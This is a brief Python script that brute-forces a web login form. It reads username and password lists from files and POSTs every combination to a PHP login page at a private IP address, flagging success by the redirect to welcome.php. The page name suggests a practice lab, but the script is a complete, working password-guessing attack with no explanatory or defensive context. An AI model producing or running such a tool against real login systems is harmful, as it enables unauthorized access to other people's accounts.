import http.client, urllib.parse            # dir()      globals()      locals()
 
username_file = open('username.txt')  
password_file = open('pass.txt')

user_list = username_file.readlines()
pass_list = password_file.readlines()

for user in user_list:
    user = user.rstrip()
    for pwd in pass_list:
        pwd = pwd.rstrip()


        print (user,"-",pwd)
        
        post_parameters = urllib.parse.urlencode({'username': user, 'password': pwd,'Submit': "Submit"})
        headers = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/html,application/xhtml+xml"}
        conn = http.client.HTTPConnection("192.168.1.129",80)  #Establishing connection
        conn.request("POST", "/bruteforce_login/verify_login.php", post_parameters, headers)
        response = conn.getresponse()

        if(response.getheader('location') == "welcome.php"):    #checking redirection
            print("Logged with:",user," - ",pwd)

